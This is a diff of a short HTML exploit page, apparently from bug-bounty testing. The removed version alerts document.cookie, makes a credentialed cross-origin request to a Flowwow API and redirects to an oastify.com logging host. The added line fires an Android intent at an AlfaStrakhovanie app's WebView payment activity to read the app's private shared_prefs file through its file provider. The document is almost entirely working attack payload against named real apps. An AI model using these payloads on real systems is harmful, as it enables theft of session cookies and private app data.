@@ -1,18 +1,7 @@
 <html>
 <body>
 <script>
-alert(document.cookie);
-fetch('https://apis.flowwow.com/clientapp/setting/whiteListExternalLinks?app_version=5.2.0&lang=ru&partner_id=1005&hash=6fdefa2855263b325d76a70284512ea3', {
-    method: 'GET',
-    credentials: 'include',
-    mode: 'cors'
-})
-.then(r => {
-    document.location = 'https://eewimlzev4h2mk3xla40ydt05rbiz9rxg.oastify.com/log?cors=YES&status=' + r.status;
-})
-.catch(e => {
-    document.location = 'https://eewimlzev4h2mk3xla40ydt05rbiz9rxg.oastify.com/log?cors=NO&err=' + e.message;
-});
+location.href = "intent:#Intent;component=ru.alfastrah.app/.ui.fragment.WebViewPaymentActivity;S.key_url=content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/shared_prefs/AppCenter.xml;end";
 </script>
-</body>  
+</body>
 </html>
